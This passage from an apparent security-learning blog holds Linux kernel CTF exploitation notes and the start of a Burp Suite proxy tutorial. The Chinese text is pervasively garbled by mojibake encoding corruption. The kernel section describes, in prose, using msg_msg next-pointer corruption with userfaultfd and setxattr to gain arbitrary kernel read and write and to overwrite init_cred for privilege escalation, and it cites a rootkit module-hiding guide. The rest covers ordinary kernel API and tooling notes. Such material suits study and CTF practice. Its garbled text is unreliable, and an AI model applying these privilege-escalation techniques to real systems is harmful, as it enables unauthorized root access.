<p>é‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°<code>msg_queue</code>ä¹‹åï¼Œå¯ä»¥å†å°†<code>msg_msg</code>çš„nextæŒ‡é’ˆæŒ‡å›<code>msg_queue</code>ï¼Œè¯»å‡ºå…¶ä¸­çš„<code>msg_msg</code>ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚</p>
<p>è¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ<code>userfaultfd</code>å’Œ<code>setxattr</code>é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚</p>
<p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚</p>

        <h4 id="ä»»æ„å†™"   >
          <a href="#ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h4>
      <p>åŒæ ·çš„ï¼Œ<code>msg_msg</code>ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ<code>msgsnd</code>ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨<code>userfaultfd</code>åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚<code>init_cred</code>ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚</p>

        <h1 id="åã€å¸¸è§å‡½æ•°æ€»ç»“"   >
          <a href="#åã€å¸¸è§å‡½æ•°æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#åã€å¸¸è§å‡½æ•°æ€»ç»“" class="headerlink" title="åã€å¸¸è§å‡½æ•°æ€»ç»“"></a>åã€å¸¸è§å‡½æ•°æ€»ç»“</h1>
      
        <h2 id="printk"   >
          <a href="#printk" class="heading-link"><i class="fas fa-link"></i></a><a href="#printk" class="headerlink" title="printk:"></a><code>printk</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printk(æ—¥å¿—çº§åˆ« <span class="string">&quot;æ¶ˆæ¯æ–‡æœ¬&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­æ—¥å¿—çº§åˆ«å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#defineKERN_EMERG <span class="string">&quot;&lt;0&gt;&quot;</span><span class="comment">/*ç´§æ€¥äº‹ä»¶æ¶ˆæ¯ï¼Œç³»ç»Ÿå´©æºƒä¹‹å‰æç¤ºï¼Œè¡¨ç¤ºç³»ç»Ÿä¸å¯ç”¨*/</span></span><br><span class="line">#defineKERN_ALERT <span class="string">&quot;&lt;1&gt;&quot;</span><span class="comment">/*æŠ¥å‘Šæ¶ˆæ¯ï¼Œè¡¨ç¤ºå¿…é¡»ç«‹å³é‡‡å–æªæ–½*/</span></span><br><span class="line">#defineKERN_CRIT <span class="string">&quot;&lt;2&gt;&quot;</span><span class="comment">/*ä¸´ç•Œæ¡ä»¶ï¼Œé€šå¸¸æ¶‰åŠä¸¥é‡çš„ç¡¬ä»¶æˆ–è½¯ä»¶æ“ä½œå¤±è´¥*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_ERR <span class="meta-string">&quot;&lt;3&gt;&quot;</span><span class="comment">/*é”™è¯¯æ¡ä»¶ï¼Œé©±åŠ¨ç¨‹åºå¸¸ç”¨KERN_ERRæ¥æŠ¥å‘Šç¡¬ä»¶çš„é”™è¯¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_WARNING <span class="meta-string">&quot;&lt;4&gt;&quot;</span><span class="comment">/*è­¦å‘Šæ¡ä»¶ï¼Œå¯¹å¯èƒ½å‡ºç°é—®é¢˜çš„æƒ…å†µè¿›è¡Œè­¦å‘Š*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_NOTICE <span class="meta-string">&quot;&lt;5&gt;&quot;</span><span class="comment">/*æ­£å¸¸ä½†åˆé‡è¦çš„æ¡ä»¶ï¼Œç”¨äºæé†’ã€‚å¸¸ç”¨äºä¸å®‰å…¨ç›¸å…³çš„æ¶ˆæ¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_INFO <span class="meta-string">&quot;&lt;6&gt;&quot;</span><span class="comment">/*æç¤ºä¿¡æ¯ï¼Œå¦‚é©±åŠ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ‰“å°ç¡¬ä»¶ä¿¡æ¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_DEBUG <span class="meta-string">&quot;&lt;7&gt;&quot;</span><span class="comment">/*è°ƒè¯•çº§åˆ«çš„æ¶ˆæ¯*/</span></span></span><br></pre></td></tr></table></div></figure>


        <h2 id="kmalloc"   >
          <a href="#kmalloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc" class="headerlink" title="kmalloc:"></a><code>kmalloc</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­flagsä¸€èˆ¬è®¾ç½®ä¸ºGFP_KERNELæˆ–è€…GFP_DMAï¼Œåœ¨å †é¢˜ä¸­ä¸€èˆ¬å°±æ˜¯</p>
<p>GFP_KERNELæ¨¡å¼ï¼Œå¦‚ä¸‹ï¼š</p>
<p>ã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€ã€€GFP_KERNEL<br>ã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ ä¸­æ–­å¤„ç†ç¨‹åºã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ è½¯ä¸­æ–­ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ Taskletã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€GFP_DMA | GFP_KERNEL<br>ã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€GFP_DMA <strong>|GFP_ATOMIC</strong></p>
<p>å…·ä½“å¯ä»¥çœ‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sky-heaven/p/7390370.html" >Linuxå†…æ ¸ç©ºé—´å†…å­˜ç”³è¯·å‡½æ•°kmallocã€kzallocã€vmallocçš„åŒºåˆ«ã€è½¬ã€‘ - sky-heaven - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>kzmalloc</code>ç±»ä¼¼ï¼Œå°±æ˜¯åˆ†é…ç©ºé—´å¹¶ä¸”å†…å­˜åˆå§‹åŒ–ä¸º0</p>

        <h2 id="kfree"   >
          <a href="#kfree" class="heading-link"><i class="fas fa-link"></i></a><a href="#kfree" class="headerlink" title="kfree:"></a><code>kfree</code>:</h2>
      <p>è¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œå°±æ˜¯ç®€å•çš„é‡Šæ”¾ã€‚</p>

        <h2 id="copy-from-user"   >
          <a href="#copy-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-from-user" class="headerlink" title="copy_from_user:"></a><code>copy_from_user</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>


        <h2 id="copy-to-user"   >
          <a href="#copy-to-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-to-user" class="headerlink" title="copy_to_user:"></a><code>copy_to_user</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_to_user(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸¤ä¸ªå°±ä¸è®²äº†ï¼Œé¡¾åæ€ä¹‰ã€‚</p>

        <h1 id="åä¸€ã€å…¶ä»–çŸ¥è¯†"   >
          <a href="#åä¸€ã€å…¶ä»–çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸€ã€å…¶ä»–çŸ¥è¯†" class="headerlink" title="åä¸€ã€å…¶ä»–çŸ¥è¯†"></a>åä¸€ã€å…¶ä»–çŸ¥è¯†</h1>
      
        <h2 id="1-å†…æ ¸æ¨¡å—éšè—"   >
          <a href="#1-å†…æ ¸æ¨¡å—éšè—" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å†…æ ¸æ¨¡å—éšè—" class="headerlink" title="1.å†…æ ¸æ¨¡å—éšè—"></a>1.å†…æ ¸æ¨¡å—éšè—</h2>
      <p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™é‡Œä¸æˆåŠŸï¼Œæ˜¾ç¤º</p>
<p><code> Unknown symbol module_mutex (err 0)</code></p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246749#h3-7" >ç®€æ˜“ Linux Rootkit ç¼–å†™å…¥é—¨æŒ‡åŒ—ï¼ˆä¸€ï¼‰ï¼šæ¨¡å—éšè—ä¸è¿›ç¨‹ææƒ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-æ–‡ä»¶ç³»ç»Ÿ"   >
          <a href="#2-æ–‡ä»¶ç³»ç»Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="2.æ–‡ä»¶ç³»ç»Ÿ"></a>2.æ–‡ä»¶ç³»ç»Ÿ</h2>
      
        <h3 id="1-SRV4æ–‡ä»¶ç³»ç»Ÿ"   >
          <a href="#1-SRV4æ–‡ä»¶ç³»ç»Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SRV4æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="(1)SRV4æ–‡ä»¶ç³»ç»Ÿ"></a>(1)SRV4æ–‡ä»¶ç³»ç»Ÿ</h3>
      <p>ä¹Ÿå°±æ˜¯å¸¸è§çš„cpioåç¼€çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330101231165.png" alt="image-20220330101231165"></p>
<p>è¿™ä¸ªç›´æ¥å¸¸ç”¨è§£åŒ…æ‰“åŒ…å³å¯</p>

        <h3 id="2-ext4æ–‡ä»¶ç³»ç»Ÿ"   >
          <a href="#2-ext4æ–‡ä»¶ç³»ç»Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ext4æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="(2)ext4æ–‡ä»¶ç³»ç»Ÿ"></a>(2)ext4æ–‡ä»¶ç³»ç»Ÿ</h3>
      <p>linuxä¸‹æŒ‚è½½ä¿®æ”¹å³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mount rootfs.ext4 mountpoint/</span><br><span class="line"><span class="built_in">cd</span> mountpoint/</span><br><span class="line"><span class="comment">#change somethin</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">sudo umount ./mountpoint</span><br></pre></td></tr></table></div></figure>

<p>å¸¸è§çš„initå¯åŠ¨è„šæœ¬åœ¨<code>/etc/init.d/rcS</code>ä¸­</p>

        <h2 id="3-è®¾å¤‡æ“ä½œ"   >
          <a href="#3-è®¾å¤‡æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è®¾å¤‡æ“ä½œ" class="headerlink" title="3.è®¾å¤‡æ“ä½œ"></a>3.è®¾å¤‡æ“ä½œ</h2>
      <ul>
<li>è·å–è®¾å¤‡ä¿¡æ¯</li>
</ul>
<p>é€šè¿‡å‘½ä»¤<code>udevadm info -a -n /dev/tty</code>è·å–ç›¸å…³è®¾å¤‡ä¿¡æ¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171652853.png" alt="image-20220330171652853"></p>
<ul>
<li>ä¿®æ”¹è®¾å¤‡æƒé™</li>
</ul>
<p>å½“æˆ‘ä»¬æ— æ³•å¯¹è®¾å¤‡è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯èƒ½æ˜¯è¢«è®¾ç½®äº†æƒé™ï¼Œå¯ä»¥é€šè¿‡<code>/etc/udev/rules.d/</code>ä¸‹æŸ¥çœ‹è®¾ç½®çš„ä¸€äº›è§„åˆ™</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171342307.png"></p>
<p>æŸ¥çœ‹ç›¸å…³çš„å†…å®¹ï¼Œå³æŒ‡å®šç›¸å…³è®¾å¤‡åå¯ä»¥è®¾ç½®å…¶ç±»ä¼¼ç”¨æˆ·ç»„<code>GROUP</code>æˆ–è€…æƒé™<code>MODE</code>ç­‰å†…å®¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171405407.png" alt="image-20220330171405407"></p>
<ul>
<li>è¯»å–</li>
</ul>
<p>ç›´æ¥<code>cat /dev/DEV_NAME</code>ç›¸å½“äº<code>open_read_close</code>è¿™ä¸ªè®¾å¤‡</p>

        <h2 id="4-è·å–å†…æ ¸ç¬¦å·"   >
          <a href="#4-è·å–å†…æ ¸ç¬¦å·" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-è·å–å†…æ ¸ç¬¦å·" class="headerlink" title="4.è·å–å†…æ ¸ç¬¦å·"></a>4.è·å–å†…æ ¸ç¬¦å·</h2>
      <p>å½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ª<code>bzImage</code>æˆ–è€…æ— ç¬¦å·çš„<code>vmlinux</code>æ–‡ä»¶æ—¶ï¼Œæƒ³è¦è·å–ç¬¦å·ä¸€èˆ¬åªæœ‰ä»¥ä¸‹ä¸¤ç§</p>

        <h3 id="1-å¯åŠ¨å†…æ ¸"   >
          <a href="#1-å¯åŠ¨å†…æ ¸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯åŠ¨å†…æ ¸" class="headerlink" title="(1)å¯åŠ¨å†…æ ¸"></a>(1)å¯åŠ¨å†…æ ¸</h3>
      <p>æˆ‘ä»¬åˆ©ç”¨busyboxåˆ¶ä½œæ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åä½¿ç”¨qemuåŠ è½½å¯åŠ¨å†…æ ¸ï¼Œå¯åŠ¨ä¹‹ååœ¨<code>/proc/kallsyms</code>ä¿å­˜æ‰€æœ‰åœ°å€ï¼Œç›´æ¥catæŸ¥çœ‹å³å¯ã€‚</p>

        <h3 id="2-ä½¿ç”¨å·¥å…·"   >
          <a href="#2-ä½¿ç”¨å·¥å…·" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä½¿ç”¨å·¥å…·" class="headerlink" title="(2)ä½¿ç”¨å·¥å…·"></a>(2)ä½¿ç”¨å·¥å…·</h3>
      <p>æœ‰ä¸ªå·¥å…·<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œè¿™ä¸ªè¿˜æ˜¯å¾ˆå¥½ä½¿çš„ï¼Œå¯ä»¥ç›´æ¥è·å¾—å¸¦ç¬¦å·çš„<code>vmlinux</code>æ–‡ä»¶</p>

        <h2 id="5-äº’æ–¥é”å’Œä¿¡å·é‡"   >
          <a href="#5-äº’æ–¥é”å’Œä¿¡å·é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-äº’æ–¥é”å’Œä¿¡å·é‡" class="headerlink" title="5.äº’æ–¥é”å’Œä¿¡å·é‡"></a>5.äº’æ–¥é”å’Œä¿¡å·é‡</h2>
      
        <h3 id="1-äº’æ–¥é”"   >
          <a href="#1-äº’æ–¥é”" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-äº’æ–¥é”" class="headerlink" title="(1)äº’æ–¥é”"></a>(1)äº’æ–¥é”</h3>
      <p>ç”¨äºçº¿ç¨‹äº’æ–¥ï¼Œä¸€ä¸ªäº’æ–¥é”çš„åŠ é”å’Œè§£é”å¿…é¡»ç”±åŒä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œæ˜¯ä¸ºäº†é˜²æ­¢å¯¹ä¸€å—å†…å­˜çš„åŒæ—¶è¯»å†™ç­‰é—®é¢˜ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/mutex.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutext</span> <span class="title">mtx</span>;</span></span><br><span class="line">mutex_init(&amp;mtx);<span class="comment">//åˆå§‹åŒ–äº’æ–¥é”</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mutex_lock_interruptible(&amp;mtx))<span class="comment">//-EINTR(é€€å‡ºè¿›ç¨‹)</span></span><br><span class="line">	<span class="keyword">return</span> -ERESTARTSYS;<span class="comment">//è¿›å…¥ç­‰å¾…</span></span><br><span class="line"><span class="comment">//.....//</span></span><br><span class="line">mutex_unlock(&amp;mtx);</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-ä¿¡å·é‡"   >
          <a href="#2-ä¿¡å·é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¿¡å·é‡" class="headerlink" title="(2)ä¿¡å·é‡"></a>(2)ä¿¡å·é‡</h3>
      <p>ç”¨äºçº¿ç¨‹åŒæ­¥ï¼Œåˆç†ä½¿ç”¨å…¬å…±èµ„æºã€‚æ¯”å¦‚ä¸€ä¸ªèµ„æºåªæœ‰5ä»½ï¼Œæ¯å½“ä¸€ä¸ªçº¿ç¨‹è·å–è¯¥èµ„æºæ—¶ï¼Œä¿¡å·é‡å°±å‡ä¸€ï¼Œå½“5ä¸ªçº¿ç¨‹éƒ½è·å¾—è¯¥èµ„æºæ—¶ï¼Œä¿¡å·é‡å‡ä¸º0ï¼Œå…¶ä»–çº¿ç¨‹å°±ä¸èƒ½å†è·å–è¯¥èµ„æºï¼Œå¤„äºç­‰å¾…çŠ¶æ€ï¼Œé˜²æ­¢æ­»é”ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/semaphore.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> <span class="title">sema</span>;</span></span><br><span class="line"></span><br><span class="line">sema_init(&amp;sema,<span class="number">1</span>);<span class="comment">//åˆå§‹åŒ–ä¿¡å·é‡ï¼Œå°†èµ„æºé‡è®¾ç½®ä¸º1</span></span><br><span class="line"><span class="keyword">if</span>(down_interruptible(&amp;sema))<span class="comment">//-EINTR(é€€å‡ºè¿›ç¨‹)</span></span><br><span class="line">	<span class="keyword">return</span> -ERESTARTSYS;<span class="comment">//è¿›å…¥ç­‰å¾…</span></span><br><span class="line"><span class="comment">//......//</span></span><br><span class="line">up(&amp;sema)</span><br></pre></td></tr></table></div></figure>




        <h2 id="6-ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨"   >
          <a href="#6-ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨" class="headerlink" title="6.ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨"></a>6.ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨</h2>
      
        <h3 id="1-ä¼ å‚çº¦å®š"   >
          <a href="#1-ä¼ å‚çº¦å®š" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¼ å‚çº¦å®š" class="headerlink" title="(1)ä¼ å‚çº¦å®š"></a>(1)ä¼ å‚çº¦å®š</h3>
      <ul>
<li>32ä½ï¼šEBXã€ECXã€EDXã€ESIã€EDIã€EBP</li>
<li>64ä½ï¼šRDIã€RSIã€RDï¼¸ã€R10ã€R8ã€R9</li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/09/Burpsuite%E4%BD%BF%E7%94%A8/">Burpsuiteä½¿ç”¨</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€é…ç½®"   >
          <a href="#ä¸€ã€é…ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€é…ç½®" class="headerlink" title="ä¸€ã€é…ç½®"></a>ä¸€ã€é…ç½®</h1>
      
        <h2 id="1-é…ç½®æµè§ˆå™¨ä»£ç†"   >
          <a href="#1-é…ç½®æµè§ˆå™¨ä»£ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-é…ç½®æµè§ˆå™¨ä»£ç†" class="headerlink" title="1.é…ç½®æµè§ˆå™¨ä»£ç†"></a>1.é…ç½®æµè§ˆå™¨ä»£ç†</h2>
      
        <h3 id="1-å®‰è£…"   >
          <a href="#1-å®‰è£…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®‰è£…" class="headerlink" title="(1)å®‰è£…"></a>(1)å®‰è£…</h3>
      <p>Edgeå®‰è£…æ’ä»¶Proxy SwitchyOmega</p>

        <h3 id="3-è®¾ç½®"   >
          <a href="#3-è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è®¾ç½®" class="headerlink" title="(3)è®¾ç½®"></a>(3)è®¾ç½®</h3>
      <p>è¿›å…¥é€‰é¡¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091240977.png" alt="image-20220109124055943"></p>
<p>é…ç½®å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091241223.png" alt="image-20220109124123157"></p>

        <h2 id="2-é…ç½®BurpSuite"   >
          <a href="#2-é…ç½®BurpSuite" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é…ç½®BurpSuite" class="headerlink" title="2.é…ç½®BurpSuite"></a>2.é…ç½®BurpSuite</h2>
      <p>Proxy-&gt;Options</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091242646.png" alt="image-20220109124203603"></p>
<p>æ²¡æœ‰çš„å¯ä»¥ç‚¹æ—è¾¹çš„AddæŒ‰é’®æ·»åŠ ã€‚</p>

        <h1 id="äºŒã€ä½¿ç”¨"   >
          <a href="#äºŒã€ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ä½¿ç”¨" class="headerlink" title="äºŒã€ä½¿ç”¨"></a>äºŒã€ä½¿ç”¨</h1>
      
        <h2 id="1-æŠ“åŒ…"   >
          <a href="#1-æŠ“åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æŠ“åŒ…" class="headerlink" title="1.æŠ“åŒ…"></a>1.æŠ“åŒ…</h2>
      
        <h3 id="1-Edgeæµè§ˆå™¨å¼€å¯ä»£ç†"   >
          <a href="#1-Edgeæµè§ˆå™¨å¼€å¯ä»£ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Edgeæµè§ˆå™¨å¼€å¯ä»£ç†" class="headerlink" title="(1)Edgeæµè§ˆå™¨å¼€å¯ä»£ç†"></a>(1)Edgeæµè§ˆå™¨å¼€å¯ä»£ç†</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091806742.png" alt="image-20220109180624711"></p>
<p>é€‰ä¸­å¦‚å›¾ä»£ç†</p>
<p>ç„¶åç»§ç»­ç‚¹å‡»ç½‘é¡µ</p>

        <h3 id="2-Burpsuiteå¼€å¯"   >
          <a href="#2-Burpsuiteå¼€å¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Burpsuiteå¼€å¯" class="headerlink" title="(2)Burpsuiteå¼€å¯"></a>(2)Burpsuiteå¼€å¯</h3>
      <p>Burpsuitä¸­</p>
<p>Proxy-&gt;Interceptå¤„ï¼Œå¦‚æœç‚¹å‡»å¦‚ä¸‹æŒ‰é’®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091809028.png" alt="image-20220109180945990"></p>
<p>é‚£ä¹ˆæ¯æ¥æ”¶ä¸€ä¸ªåŒ…ï¼ŒBurpSuiteéƒ½ä¼šæ‹¦æˆªï¼Œéœ€è¦ç‚¹å‡»Frowardç»§ç»­ï¼Œæˆ–è€…ä¸¢å¼ƒDropè¯¥åŒ…ï¼Œé¡µé¢æ‰ä¼šç»§ç»­åŠ è½½ã€‚</p>
<p>ç„¶ååˆ°Target-&gt;Site mapå¤„ï¼Œå³å¯çœ‹åˆ°æ‹¦æˆªçš„æ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091812502.png" alt="image-20220109181204449"></p>

        <h2 id="2-æ”¹åŒ…"   >
          <a href="#2-æ”¹åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ”¹åŒ…" class="headerlink" title="2.æ”¹åŒ…"></a>2.æ”¹åŒ…</h2>
      
        <h3 id="1-å…ˆæŠ“åŒ…"   >
          <a href="#1-å…ˆæŠ“åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å…ˆæŠ“åŒ…" class="headerlink" title="(1)å…ˆæŠ“åŒ…"></a>(1)å…ˆæŠ“åŒ…</h3>
      <p>é¦–å…ˆæµè§ˆå™¨å¼€å¯ä»£ç†ï¼ŒBurpSuiteæŠ“åˆ°åŒ…</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424692.png" alt="image-20220111141339457"></p>

        <h3 id="2-å‘é€åˆ°Repeater"   >
          <a href="#2-å‘é€åˆ°Repeater" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‘é€åˆ°Repeater" class="headerlink" title="(2)å‘é€åˆ°Repeater"></a>(2)å‘é€åˆ°Repeater</h3>
      <p>ç„¶åå°†åŒ…å‘é€åˆ°<code>repeater</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424737.png" alt="image-20220111141424655"></p>
